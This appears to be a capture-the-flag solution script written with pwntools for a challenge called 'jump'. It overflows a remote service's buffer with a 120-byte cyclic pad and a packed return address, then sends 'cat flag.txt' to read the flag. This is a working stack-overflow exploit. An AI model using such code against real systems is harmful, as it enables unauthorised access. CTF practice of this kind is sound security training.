#!/bin/python
from pwn import *
#target = process("./jump")
target = remote("forever.isss.io", 1303)
target.recvline() # Haha! I removed the if statement! You can never hack me now!
target.recvline() # Gimme some input






target.sendline(cyclic(120)+p64(0x4011c7))

target.sendline(b'cat flag.txt')
print(target.recvline())
